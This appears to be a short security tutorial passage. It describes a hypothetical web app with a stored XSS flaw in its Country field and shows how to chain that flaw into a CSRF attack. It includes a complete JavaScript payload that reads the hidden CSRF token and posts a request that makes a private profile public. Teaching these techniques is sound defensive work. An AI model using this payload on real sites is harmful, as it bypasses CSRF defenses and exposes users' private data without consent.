Imagine a web application that has a mini-profile feature, which shows a user's name, email, and country. It also has a "Change Visibility" functionality, that allows a user to make their profile public or private.

Additional facts about the application:
- The application features same origin/same site protections as anti-CSRF measures (through a server configuration)
- The application's _Country_ field is vulnerable to stored XSS attacks.

For this scenario, we will target the Change Visibility functionality, because a successful CSRF attack would cause the disclosure of a private profile.

We will use the following payload and insert it in the Country field:
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>
```